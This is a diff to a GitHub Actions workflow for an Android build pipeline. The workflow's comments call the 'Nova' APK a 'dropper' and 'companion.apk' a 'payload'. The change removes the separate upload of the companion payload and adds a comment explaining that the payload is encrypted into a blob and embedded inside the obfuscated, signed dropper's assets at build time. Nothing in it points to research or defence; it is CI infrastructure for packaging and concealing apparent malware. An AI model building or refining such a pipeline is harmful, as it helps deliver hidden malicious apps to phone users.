@@ -830,22 +830,15 @@ jobs:
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
 
-      # ── 11. Upload both APK artifacts ────────────────────────────────────────
-      # Nova (dropper) — final obfuscated + signed APK
+      # ── 11. Upload Nova APK artifact ─────────────────────────────────────────
+      # Nova (dropper) is the single deliverable APK.
+      # companion.apk is encrypted to a binary blob by step_encrypt_companion()
+      # and embedded inside Nova's assets/ at Gradle build time — NOT a separate output.
       - name: Upload Nova APK artifact
         uses: actions/upload-artifact@v4
         with:
           name: nova-dropper-${{ github.run_number }}
           path: app/build/outputs/apk/release/nova_*.apk
-          retention-days: 7
-          overwrite: true
-
-      # Companion (payload) — encrypted + signed companion APK
-      - name: Upload Companion APK artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: companion-payload-${{ github.run_number }}
-          path: app/src/main/assets/companion.apk
           retention-days: 7
           overwrite: true
 
